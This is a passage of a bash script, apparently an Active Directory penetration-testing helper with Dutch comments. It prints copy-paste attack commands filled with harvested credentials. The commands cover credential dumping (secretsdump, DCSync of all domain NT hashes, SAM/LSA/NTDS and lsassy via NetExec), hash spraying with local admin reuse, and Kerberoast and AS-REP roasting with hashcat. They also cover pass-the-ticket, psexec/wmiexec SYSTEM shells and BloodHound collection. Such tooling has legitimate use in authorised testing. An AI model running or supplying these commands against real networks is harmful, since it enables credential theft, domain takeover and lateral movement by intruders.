                    [[ -z "$_u" ]] && continue
                    [[ -z "${_DOM_PWNED["${_u}|${_s}|${_sip}"]+set}" ]] && continue
                    local _dm="${_d:-$DOMAIN}"; local _dp="${_dm:+$_dm/}"
                    if [[ "$_ct" == "hash" ]]; then
                        _ms "impacket-secretsdump '${_dp}${_u}'@${_sip} -hashes ':${_s}'"
                        [[ "$_sip" == "$DC_IP" ]] && \
                            _ms "impacket-secretsdump '${_dp}${_u}'@${_sip} -hashes ':${_s}' -just-dc-ntlm  # DCSync — dumps ALL domain NT hashes"
                        _ms "nxc smb ${_sip} -u '${_u}' -H '${_s}' --sam"
                        _ms "nxc smb ${_sip} -u '${_u}' -H '${_s}' --lsa"
                        _ms "nxc smb ${_sip} -u '${_u}' -H '${_s}' --ntds  # DC only"
                        _ms "nxc smb ${_sip} -u '${_u}' -H '${_s}' -M lsassy"
                    else
                        _ms "impacket-secretsdump '${_dp}${_u}:${_s}@${_sip}'"
                        [[ "$_sip" == "$DC_IP" ]] && \
                            _ms "impacket-secretsdump '${_dp}${_u}:${_s}@${_sip}' -just-dc-ntlm  # DCSync — dumps ALL domain NT hashes"
                        _ms "nxc smb ${_sip} -u '${_u}' -p '${_s}' --sam"
                        _ms "nxc smb ${_sip} -u '${_u}' -p '${_s}' --lsa"
                        _ms "nxc smb ${_sip} -u '${_u}' -p '${_s}' --ntds  # DC only"
                        _ms "nxc smb ${_sip} -u '${_u}' -p '${_s}' -M lsassy"
                    fi
                done <<< "${_M_LOCAL_USERS[$_sip]}"
                # After --sam recovers local NT hashes → spray laterally with --local-auth
                echo -e "${CYAN}  # ── LOCAL ADMIN REUSE (spray NT hash from --sam across all targets)${NC}"
                echo -e "${GRAY}  >> nxc smb $OUTDIR/targets_smb.txt -u 'Administrator' -H 'NT_HASH' --local-auth --continue-on-success${NC}"
                echo -e "${GRAY}  >> nxc smb $OUTDIR/targets_smb.txt -u 'NT_USER' -H 'NT_HASH' --local-auth --continue-on-success${NC}"
            fi

            # KERBEROS section — always shown if DC_IP known
            if [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
                echo ""
                _mh "KERBEROAST / AS-REP  (DC: $DC_IP)"
                if [[ -n "$_best_pass_user" ]]; then
                    _mc true "impacket-GetUserSPNs '${_best_pass_dom}/${_best_pass_user}:${_best_pass_secret}' -dc-ip '${DC_IP}' -request -outputfile kerberoast.hash"
                    echo -e "${GRAY}     hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt${NC}"
                    _mc true "impacket-GetNPUsers '${_best_pass_dom}/' -dc-ip '${DC_IP}' -usersfile confirmed_users.txt -format hashcat -outputfile asrep.hash"
                    echo -e "${GRAY}     hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt${NC}"
                else
                    # Hash-only creds — GetUserSPNs still works with -hashes
                    while IFS='|' read -r _u _ct _s _d; do
                        [[ -z "$_u" || "$_ct" != "hash" ]] && continue
                        local _dm="${_d:-$DOMAIN}"
                        _mc true "impacket-GetUserSPNs '${_dm}/${_u}' -hashes ':${_s}' -dc-ip '${DC_IP}' -request"
                        _mc true "impacket-GetNPUsers '${_dm}/' -dc-ip '${DC_IP}' -usersfile confirmed_users.txt -format hashcat"
                        break
                    done <<< "$_DOM_LIST"
                fi
                _mc false "ntpdate -u '${DC_IP}'  # fix clock skew if Kerberos errors"

                # Pass-the-ticket workflow — shown after cracking section so context is clear
                echo ""
                _mh "PASS-THE-TICKET (use after cracking Kerberoast / AS-REP hashes)"
                echo -e "${GRAY}  # Step 1 — get TGT for cracked account:${NC}"
                if [[ -n "$_best_pass_user" ]]; then
                    _mc false "impacket-getTGT '${_best_pass_dom}/${_best_pass_user}:CRACKED_PASS' -dc-ip '${DC_IP}'"
                else
                    echo -e "${GRAY}  >> impacket-getTGT '${DOMAIN}/CRACKED_USER:CRACKED_PASS' -dc-ip '${DC_IP}'${NC}"
                fi
                echo -e "${GRAY}  # Step 2 — export ticket and use with -k -no-pass:${NC}"
                echo -e "${GRAY}  >> export KRB5CCNAME=\$(ls -t *.ccache 2>/dev/null | head -1)${NC}"
                _mc false "impacket-wmiexec '${DOMAIN}/CRACKED_USER@${DC_IP}' -k -no-pass"
                _mc false "impacket-psexec '${DOMAIN}/CRACKED_USER@${DC_IP}' -k -no-pass  # spawns nt authority\\system shell"
                echo -e "${GRAY}  # Step 3 — DCSync with ticket (if account has replication rights / is DA):${NC}"
                echo -e "${GRAY}  >> impacket-secretsdump '${DOMAIN}/CRACKED_USER@${DC_IP}' -k -no-pass -just-dc-ntlm${NC}"
            fi

        done

        unset _M_LOCAL_USERS _M_HN _M_HAS_SSH _M_HAS_WINRM _M_HAS_MSSQL _M_HAS_LDAP _M_IP_SEEN _DOM_SEEN _DOM_PWNED



        # ── Scan-only port hints (http/https/redis/oracle) ──
        # Web/DB hints already shown in Phase 6 — skip duplicate here

        # ── Legend ──
            fi

    echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    OUTPUT FILES                           ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${WHITE}User Lists:${NC}"
    [[ -s "$OUTDIR/all_users_clean.txt" ]] && echo "  $OUTDIR/all_users_clean.txt      - Consolidated users (clean)"
    [[ -s "$OUTDIR/all_users_full.txt" ]] && echo "  $OUTDIR/all_users_full.txt       - All users"
    [[ -s "$OUTDIR/users_generated.txt" ]] && echo "  $OUTDIR/users_generated.txt      - Generated username variations"
    [[ -s "$OUTDIR/valid_users_kerbrute.txt" ]] && echo "  $OUTDIR/valid_users_kerbrute.txt - Kerbrute validated users"
    [[ -s "$OUTDIR/user_descriptions.txt" ]] && echo -e "  ${YELLOW}$OUTDIR/user_descriptions.txt${NC}    - Check for passwords!"
    
    # Toon hashbestanden als die bestaan
    local has_hashes=false
    for hashfile in "$OUTDIR"/*_rc4.hash "$OUTDIR"/*_aes.hash "$OUTDIR"/kerberoast.txt; do
        [[ -f "$hashfile" ]] && has_hashes=true && break
    done
    
    if [[ "$has_hashes" == true ]]; then
        echo ""
        echo -e "${WHITE}Hash Files (CRACK THESE!):${NC}"
        [[ -s "$OUTDIR/kerberoast.txt" ]] && echo -e "  ${RED}$OUTDIR/kerberoast.txt${NC}           - hashcat -m 13100 (Kerberoast)"
        [[ -s "$OUTDIR/asrep_all.txt" ]] && echo -e "  ${RED}$OUTDIR/asrep_all.txt${NC}            - All AS-REP hashes combined"
        
        # Toon losse RC4-hashbestanden
        for hashfile in "$OUTDIR"/*_rc4.hash; do
            [[ -f "$hashfile" ]] && echo -e "  ${RED}$hashfile${NC} - hashcat -m 18200 (RC4 - FAST)"
        done
        
        # Toon losse AES-hashbestanden
        for hashfile in "$OUTDIR"/*_aes.hash; do
            [[ -f "$hashfile" ]] && echo -e "  ${YELLOW}$hashfile${NC} - hashcat -m 19900 (AES)"
        done
    fi
    
    echo ""
    echo -e "${WHITE}Other:${NC}"
    [[ -s "$CREDS_FILE" ]] && echo -e "  ${GREEN}$CREDS_FILE${NC}          - All found credentials"
    [[ -s "$HYDRA_CMDS" ]] && echo "  $HYDRA_CMDS          - Run: bash $HYDRA_CMDS"
    [[ -s "$OUTDIR/ldap_naming_contexts.txt" ]] && echo "  $OUTDIR/ldap_naming_contexts.txt - Domain naming contexts"
    [[ -s "$OUTDIR/passwords_from_desc.txt" ]] && echo -e "  ${RED}$OUTDIR/passwords_from_desc.txt${NC} - Passwords extracted from descriptions!"
    
    # ═══════════════════════════════════════════════════════════════════════
    # Ik markeer sectie: COPY-PASTE VARIABLES
    # ═══════════════════════════════════════════════════════════════════════
    if [[ -s "$CREDS_FILE" ]]; then
        echo ""
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║          QUICK VARIABLES (copy-paste)                     ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        
        local first_ip=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
        local first_cred=$(head -1 "$CREDS_FILE")
        IFS='|' read -r v_proto v_ip v_domain v_user v_secret v_pwned v_cred_type v_access_info <<< "$first_cred"
        
        echo -e "${YELLOW}# Set variables for further exploration:${NC}"
        echo -e "${WHITE}ip=$first_ip; DC=$first_ip; DOM=${v_domain:-$DOMAIN}; USR=$v_user; PWD='$v_secret'${NC}"
        echo ""
        
        # Toon alle credentialsets
        local var_shown=""
        while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
            local var_key="$user|$secret"
            [[ "$var_shown" == *"$var_key"* ]] && continue
            var_shown="$var_shown $var_key"
            
            if [[ "$cred_type" == "hash" ]]; then
                echo -e "${WHITE}# $user (hash):${NC}"
                echo -e "ip=$ip; DC=$ip; DOM=${domain:-$DOMAIN}; USR=$user; HASH='$secret'"
            else
                echo -e "${WHITE}# $user:${NC}"
                echo -e "ip=$ip; DC=$ip; DOM=${domain:-$DOMAIN}; USR=$user; PWD='$secret'"
            fi
        done < "$CREDS_FILE"
    fi
    
    # ═══════════════════════════════════════════════════════════════════════
    # Ik markeer sectie: SMB SHARES WITH ACCESS
    # ═══════════════════════════════════════════════════════════════════════
    if [[ -s "$OUTDIR/share_names.txt" ]] || [[ -s "$OUTDIR/shares_smbclient.txt" ]] || [[ -s "$OUTDIR/shares_impacket.txt" ]]; then
        echo ""
        echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}SMB SHARES:${NC}"
        echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
        
        local first_ip=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
        
        # Toon shares uit impacket-uitvoer (voorkeur)
        if [[ -s "$OUTDIR/shares_impacket.txt" ]]; then
            echo ""
            grep -E "^[A-Za-z]" "$OUTDIR/shares_impacket.txt" 2>/dev/null | grep -v "^Impacket\|^Type\|^#" | while read -r line; do
                local share=$(echo "$line" | awk '{print $1}')
                echo -e "    ${CYAN}$share${NC}"
            done
        elif [[ -s "$OUTDIR/shares_smbclient.txt" ]]; then
            echo ""
            grep -E "^\s+\S+\s+(Disk|IPC)" "$OUTDIR/shares_smbclient.txt" 2>/dev/null | while read -r line; do
                local share=$(echo "$line" | awk '{print $1}')
                local stype=$(echo "$line" | awk '{print $2}')
                echo -e "    ${CYAN}$share${NC} ($stype)"
            done
        fi
        
        # Ik raad impacket-smbclient aan (betrouwbaarder dan smbclient!)
        echo ""
        echo -e "${GREEN}# RECOMMENDED: impacket-smbclient (works when nxc/smbclient fail!)${NC}"
        printf "%b>> %s%b\n" "$GRAY" "smbclient.py ''/'anonymous'@$first_ip -no-pass" "$NC"
        echo -e "${WHITE}   # Useful commands inside smbclient.py:${NC}"
        echo -e "${GRAY}   shares              # List all shares${NC}"
        echo -e "${GRAY}   use SHARE           # Connect to share${NC}"
        echo -e "${GRAY}   tree                # Recursive directory listing (VERY useful!)${NC}"
        echo -e "${GRAY}   ls                  # List files${NC}"
        echo -e "${GRAY}   get FILE            # Download file${NC}"
        echo -e "${GRAY}   mget *              # Download all files${NC}"
        
        # Toon toegangscommandoo's voor specifieke shares
        if [[ -s "$OUTDIR/share_names.txt" ]]; then
            echo ""
            echo -e "${WHITE}# Access specific shares:${NC}"
            for share in $(cat "$OUTDIR/share_names.txt" 2>/dev/null | grep -Ev '^(ADMIN\$|C\$|IPC\$)$' | head -5); do
                printf "%b>> %s%b\n" "$GRAY" "smbclient.py ''/'anonymous'@$first_ip -no-pass   # then: use $share" "$NC"
            done
        fi
        
        # Als ik creds heb, toon ik geauthenticeerde toegang
        if [[ -s "$CREDS_FILE" ]]; then
            local first_cred=$(head -1 "$CREDS_FILE")
            IFS='|' read -r proto ip domain user secret pwned cred_type access_info <<< "$first_cred"
            if [[ "$cred_type" != "hash" ]]; then
                echo ""
                echo -e "${WHITE}# Authenticated access with credentials:${NC}"
                printf "%b>> %s%b\n" "$GRAY" "smbclient.py '$domain/$user:$secret'@$first_ip" "$NC"
                printf "%b>> %s%b\n" "$GRAY" "smbclient //$first_ip/SHARE -U '$user%$secret'" "$NC"
            else
                echo ""
                echo -e "${WHITE}# Authenticated access with hash (PTH):${NC}"
                printf "%b>> %s%b\n" "$GRAY" "smbclient.py '$domain/$user'@$first_ip -hashes ':$secret'" "$NC"
            fi
        fi
    fi
    
    # ═══════════════════════════════════════════════════════════════════════
    # Ik markeer sectie: BLOODHOUND COLLECTION
    # ═══════════════════════════════════════════════════════════════════════
    if [[ -s "$CREDS_FILE" ]] && [[ -n "$DOMAIN" ]] && [[ "$STANDALONE" != true ]]; then
        echo ""
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${MAGENTA}BLOODHOUND COLLECTION:${NC}"
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        
        local first_ip=$(head -1 "$TARGET_ARG" 2>/dev/null || echo "$TARGET_ARG")
        
        echo -e "${WHITE}# bloodhound-ce-python (recommended for BloodHound CE):${NC}"
        local bh_shown=""
        while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
            [[ "$cred_type" == "hash" ]] && continue  # BloodHound-python needs password
            local bh_key="$user|$secret"
            [[ "$bh_shown" == *"$bh_key"* ]] && continue
            bh_shown="$bh_shown $bh_key"
            printf "%b>> %s%b\n" "$GRAY" "bloodhound-ce-python -d '$domain' -u '$user' -p '$secret' -ns '${DC_IP:-$ip}' --dns-tcp -c All --zip" "$NC"
        done < "$CREDS_FILE"
        
        echo ""
        echo -e "${WHITE}# NetExec bloodhound:${NC}"
        local bh_shown2=""
        while IFS='|' read -r proto ip domain user secret pwned cred_type access_info; do
            [[ "$cred_type" == "hash" ]] && continue
            local bh_key="$user|$secret"
            [[ "$bh_shown2" == *"$bh_key"* ]] && continue
            bh_shown2="$bh_shown2 $bh_key"
            printf "%b>> %s%b\n" "$GRAY" "nxc ldap $first_ip -u '$user' -p '$secret' --bloodhound -c All --dns-tcp" "$NC"
            break  # Only show one NXC command
        done < "$CREDS_FILE"
        
        echo -e "${CYAN}[*] Upload .zip to BloodHound GUI for attack path analysis${NC}"
        echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    fi
}
